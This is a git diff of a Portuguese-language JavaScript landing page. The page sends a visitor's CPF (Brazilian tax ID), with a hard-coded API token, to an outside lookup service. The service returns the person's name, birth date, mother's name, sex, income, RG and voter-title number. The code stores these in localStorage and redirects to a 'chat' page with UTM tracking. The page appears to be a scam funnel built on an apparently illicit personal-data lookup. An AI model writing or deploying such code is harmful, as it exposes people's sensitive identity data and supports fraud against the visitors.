@@ -23,11 +23,10 @@ document.addEventListener("DOMContentLoaded", function () {
 
   // Campos de informação do usuário
   const nomeUsuario = document.getElementById("nomeUsuario");
+  const dataNascimento = document.getElementById("dataNascimento");
   const cpfUsuario = document.getElementById("cpfUsuario");
   const sexoUsuario = document.getElementById("sexoUsuario");
   const nomeMae = document.getElementById("nomeMae");
-  // se existir na tela, a gente preenche; se não existir, só ignora
-  const dataNascimento = document.getElementById("dataNascimento");
 
   // Obter parâmetros UTM
   function getUTMParams() {
@@ -82,31 +81,21 @@ document.addEventListener("DOMContentLoaded", function () {
     return cpf.length === 11;
   }
 
-  // Formatação de data (YYYYMMDD para DD/MM/YYYY ou deixa como está se já estiver formatada)
+  // Formatação de data (DD/MM/YYYY ou mantém formato existente)
   function formatDate(dateString) {
     if (!dateString) return "Não informado";
 
-    // Verifica se a data já está no formato DD/MM/YYYY
+    // Se já estiver no formato DD/MM/YYYY, retorna como está
     if (dateString.includes("/")) {
       return dateString;
     }
 
-    // Converte do formato YYYYMMDD para DD/MM/YYYY
-    if (dateString.length === 8) {
-      return dateString.replace(/^(\d{4})(\d{2})(\d{2})$/, "$3/$2/$1");
-    }
-
+    // Tentar outros formatos se necessário
     return dateString;
   }
 
-  
-
-  // ==========================
-  // CONSULTA CPF (NOVA API BK)
-  // ==========================
+  // Consultar CPF na nova API
   function consultarCPF(cpf) {
-    const cpfLimpo = cpf.replace(/\D/g, "");
-
     // Mostrar resultados e estado de carregamento
     consultaResultado.classList.remove("hidden");
     loadingInfo.classList.remove("hidden");
@@ -116,82 +105,65 @@ document.addEventListener("DOMContentLoaded", function () {
     // Rolar para baixo para mostrar o carregamento
     consultaResultado.scrollIntoView({ behavior: "smooth", block: "center" });
 
-    // Executar a consulta
-    fetch(
-      `⁠ https://searchapi.dnnl.live/consulta?token_api=5717&cpf=${cpf} `
-    )
+    // Executar a consulta na nova API
+    fetch(`https://searchapi.dnnl.live/consulta?token_api=1359&cpf=${cpf}`)
       .then((response) => {
         if (!response.ok) {
           throw new Error(`Erro na consulta: ${response.status}`);
         }
         return response.json();
       })
-      .then((response) => {
+      .then((data) => {
         // Ocultar loading
         loadingInfo.classList.add("hidden");
 
-        // Processar os dados da API
-        // Formato esperado: { cpf, nome, mae, sexo, nascimento }
-        let raw = response;
-        let data = null;
-
-        try {
-          if (raw && (raw.cpf || raw.nome)) {
-            // Normalizar para as chaves usadas no resto do código
-            data = {
-              CPF: raw.cpf || "",
-              NOME: raw.nome || "",
-              NOME_MAE: raw.mae || "",
-              NASC: raw.nascimento || "",
-              SEXO: raw.sexo || "",
-            };
-          }
-        } catch (e) {
-          console.error("Erro ao interpretar resposta da API:", e, raw);
-        }
-
-                if (data) {
-          console.log("Dados normalizados:", data);
-
+        // Processar os dados da nova API
+        if (data && data.status === 200 && data.dados && data.dados.length > 0) {
+          const usuario = data.dados[0];
+          console.log("Dados recebidos:", usuario);
+          
           // Preencher os campos com os dados do usuário
-          nomeUsuario.textContent = data.NOME || "Não informado";
-
-          if (dataNascimento) {
-            dataNascimento.textContent =
-              formatDate(data.NASC) || "Não informado";
-          }
-
-          cpfUsuario.textContent = data.CPF
-            ? data.CPF.replace(
-                /^(\d{3})(\d{3})(\d{3})(\d{2})$/,
-                "$1.$2.$3-$4"
-              )
+          nomeUsuario.textContent = usuario.NOME || "Não informado";
+          dataNascimento.textContent = formatDate(usuario.NASC) || "Não informado";
+          cpfUsuario.textContent = usuario.CPF 
+            ? usuario.CPF.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4")
             : "Não informado";
-
-          sexoUsuario.textContent = data.SEXO || "Não informado";
-          nomeMae.textContent = data.NOME_MAE || "Não informado";
+          
+          // Formatar sexo
+          let sexoText = "Não informado";
+          if (usuario.SEXO === "MASCULINO") {
+            sexoText = "Masculino";
+          } else if (usuario.SEXO === "FEMININO") {
+            sexoText = "Feminino";
+          }
+          sexoUsuario.textContent = sexoText;
+          
+          nomeMae.textContent = usuario.NOME_MAE || "Não informado";
 
           // Salvar dados no objeto para usar depois
           const dadosUsuario = {
-            nome: data.NOME || "",
-            dataNascimento: data.NASC || "",
-            nomeMae: data.NOME_MAE || "",
-            cpf: data.CPF || "",
-            sexo: data.SEXO || "",
+            nome: usuario.NOME,
+            dataNascimento: usuario.NASC,
+            nomeMae: usuario.NOME_MAE,
+            cpf: usuario.CPF,
+            sexo: usuario.SEXO,
+            renda: usuario.RENDA,
+            orgaoEmissor: usuario.ORGAO_EMISSOR,
+            rg: usuario.RG,
+            tituloEleitor: usuario.TITULO_ELEITOR,
+            ufEmissao: usuario.UF_EMISSAO
           };
 
           // Salvar no localStorage para uso posterior
           localStorage.setItem("dadosUsuario", JSON.stringify(dadosUsuario));
 
           // Salvar nome e CPF separadamente para acesso fácil
-          if (dadosUsuario.nome) {
-            localStorage.setItem("nomeUsuario", dadosUsuario.nome);
+          if (usuario.NOME) {
+            localStorage.setItem("nomeUsuario", usuario.NOME);
           }
-          if (dadosUsuario.cpf) {
-            localStorage.setItem("cpfUsuario", dadosUsuario.cpf);
+          if (usuario.CPF) {
+            localStorage.setItem("cpfUsuario", usuario.CPF);
           }
-
-
 
           // Mostrar informações do usuário
           userInfo.classList.remove("hidden");
@@ -202,8 +174,10 @@ document.addEventListener("DOMContentLoaded", function () {
           }, 100);
         } else {
           // Mostrar erro
-          errorMessage.textContent =
-            "Não foi possível obter os dados para este CPF.";
+          errorMessage.textContent = 
+            (data && data.dados && data.dados.length === 0) 
+              ? "Nenhum dado encontrado para este CPF." 
+              : "Não foi possível obter os dados para este CPF.";
           errorInfo.classList.remove("hidden");
 
           // Rolar para mostrar o erro
@@ -213,7 +187,7 @@ document.addEventListener("DOMContentLoaded", function () {
       .catch((error) => {
         // Ocultar loading e mostrar erro
         loadingInfo.classList.add("hidden");
-        errorMessage.textContent =
+        errorMessage.textContent = 
           error.message || "Ocorreu um erro ao consultar seus dados.";
         errorInfo.classList.remove("hidden");
         console.error("Erro na consulta:", error);
@@ -235,32 +209,41 @@ document.addEventListener("DOMContentLoaded", function () {
 
   // Mostrar página de CPF
   function showCPFPage() {
+    // Adiciona classe para fade-out da página principal
     mainPage.classList.add("fade-out");
 
+    // Após a animação, esconde a página principal e mostra a página de CPF
     setTimeout(() => {
       mainPage.classList.add("hidden");
       cpfPage.classList.remove("hidden");
 
+      // Trigger reflow para iniciar nova animação
       void cpfPage.offsetWidth;
 
+      // Fade-in da página CPF
       cpfPage.classList.add("fade-in");
       cpfPage.classList.remove("opacity-0");
 
+      // Focar no input de CPF
       cpfInputPage.focus();
     }, 400);
   }
 
   // Voltar para a página principal
   function showMainPage() {
+    // Adiciona classe para fade-out da página de CPF
     cpfPage.classList.remove("fade-in");
     cpfPage.classList.add("opacity-0");
 
+    // Após a animação, esconde a página de CPF e mostra a página principal
     setTimeout(() => {
       cpfPage.classList.add("hidden");
       mainPage.classList.remove("hidden");
 
+      // Trigger reflow para iniciar nova animação
       void mainPage.offsetWidth;
 
+      // Fade-in da página principal
       mainPage.classList.remove("fade-out");
     }, 400);
   }
@@ -285,12 +268,13 @@ document.addEventListener("DOMContentLoaded", function () {
     localStorage.setItem("cpf", cpf);
     console.log("CPF salvo no localStorage:", cpf);
 
-    // Consultar CPF na API em vez de redirecionar imediatamente
+    // Consultar CPF na API
     consultarCPF(cpf);
   }
 
   // Redirecionar para o chat após confirmar os dados
   function redirecionarParaChat() {
+    // Verificar se temos os dados da API
     const dadosUsuarioJSON = localStorage.getItem("dadosUsuario");
     if (!dadosUsuarioJSON) {
       alert("Dados do usuário não encontrados. Por favor, tente novamente.");
@@ -304,17 +288,24 @@ document.addEventListener("DOMContentLoaded", function () {
         return;
       }
 
+      // Obter CPF formatado apenas com números
       const cpf = dadosUsuario.cpf.replace(/\D/g, "");
 
+      // Obter todos os parâmetros da URL atual
       const urlAtual = new URLSearchParams(window.location.search);
+
+      // Criar um novo objeto URLSearchParams para a nova URL
       const novaUrl = new URLSearchParams();
 
+      // Adicionar todos os parâmetros atuais à nova URL
       for (const [chave, valor] of urlAtual.entries()) {
         novaUrl.append(chave, valor);
       }
 
+      // Adicionar ou atualizar o parâmetro CPF
       novaUrl.set("cpf", cpf);
 
+      // Redirecionar para a página chat.html com todos os parâmetros
       window.location.href = `./chat/index.html?${novaUrl.toString()}`;
     } catch (error) {
       console.error("Erro ao processar dados para redirecionamento:", error);
@@ -337,17 +328,14 @@ document.addEventListener("DOMContentLoaded", function () {
   }
 
   // Event Listeners
-  if (btnAtivar) btnAtivar.addEventListener("click", showCPFPage);
-  if (btnSimular) btnSimular.addEventListener("click", showCPFPage);
-  if (btnVoltar) btnVoltar.addEventListener("click", showMainPage);
-
-  if (btnAnalisar) {
-    btnAnalisar.addEventListener("click", function () {
-      console.log("Botão Analisar clicado");
-      console.log("Valor do CPF antes do processamento:", cpfInputPage.value);
-      processForm();
-    });
-  }
+  btnAtivar.addEventListener("click", showCPFPage);
+  btnSimular.addEventListener("click", showCPFPage);
+  btnVoltar.addEventListener("click", showMainPage);
+  btnAnalisar.addEventListener("click", function () {
+    console.log("Botão Analisar clicado");
+    console.log("Valor do CPF antes do processamento:", cpfInputPage.value);
+    processForm();
+  });
 
   // Listeners para os botões de confirmação/correção
   if (btnConfirmar) {
@@ -363,16 +351,12 @@ document.addEventListener("DOMContentLoaded", function () {
   }
 
   // Formatação de CPF enquanto digita
-  if (cpfInputPage) {
-    cpfInputPage.addEventListener("input", function () {
-      formatCPF(this);
-      console.log("CPF formatado durante digitação:", this.value);
-    });
-  }
+  cpfInputPage.addEventListener("input", function () {
+    formatCPF(this);
+    console.log("CPF formatado durante digitação:", this.value);
+  });
 
-  // ======================
-  // Carrossel (igual antes)
-  // ======================
+  // Carrossel Functionality
   const carousel = document.getElementById("carousel");
   const slides = document.querySelectorAll(".carousel-item");
   const indicators = document.querySelectorAll(".carousel-indicator");
@@ -385,19 +369,24 @@ document.addEventListener("DOMContentLoaded", function () {
   let currentSlide = 0;
   let autoSlideInterval;
 
+  // Função para mostrar um slide específico
   function showSlide(index) {
+    // Loop infinito
     if (index < 0) {
       index = slides.length - 1;
     } else if (index >= slides.length) {
       index = 0;
     }
 
+    // Ocultar todos os slides
     slides.forEach((slide) => {
       slide.classList.remove("active");
     });
 
+    // Mostrar slide atual
     slides[index].classList.add("active");
 
+    // Atualizar indicadores
     indicators.forEach((indicator, i) => {
       if (i === index) {
         indicator.classList.add("active");
@@ -406,10 +395,13 @@ document.addEventListener("DOMContentLoaded", function () {
       }
     });
 
+    // Atualizar etapas
     updateSteps(index);
+
     currentSlide = index;
   }
 
+  // Atualizar os passos
   function updateSteps(index) {
     stepNumbers.forEach((step, i) => {
       step.classList.remove("active", "completed");
@@ -430,26 +422,31 @@ document.addEventListener("DOMContentLoaded", function () {
     });
   }
 
+  // Navegar para o próximo slide
   function nextSlide() {
     showSlide(currentSlide + 1);
     resetAutoSlide();
   }
 
+  // Navegar para o slide anterior
   function prevSlide() {
     showSlide(currentSlide - 1);
     resetAutoSlide();
   }
 
+  // Iniciar rotação automática
   function startAutoSlide() {
     autoSlideInterval = setInterval(nextSlide, 5000);
   }
 
+  // Resetar rotação automática
   function resetAutoSlide() {
     clearInterval(autoSlideInterval);
     startAutoSlide();
   }
 
-  if (prevBtn && nextBtn && carousel) {
+  // Event listeners para o carrossel
+  if (prevBtn && nextBtn) {
     nextBtn.addEventListener("click", nextSlide);
     prevBtn.addEventListener("click", prevSlide);
 
@@ -468,6 +465,7 @@ document.addEventListener("DOMContentLoaded", function () {
       });
     });
 
+    // Touch swipe para dispositivos móveis
     let touchStartX = 0;
 
     carousel.addEventListener(
@@ -485,14 +483,17 @@ document.addEventListener("DOMContentLoaded", function () {
         const diff = touchEndX - touchStartX;
 
         if (diff > 50) {
+          // Swipe right
           prevSlide();
         } else if (diff < -50) {
+          // Swipe left
           nextSlide();
         }
       },
       { passive: true }
     );
 
+    // Pausar autoplay quando mouse está sobre o carrossel
     carousel.addEventListener("mouseenter", () => {
       clearInterval(autoSlideInterval);
     });
@@ -501,6 +502,7 @@ document.addEventListener("DOMContentLoaded", function () {
       startAutoSlide();
     });
 
+    // Iniciar o carrossel
     showSlide(0);
     startAutoSlide();
   }
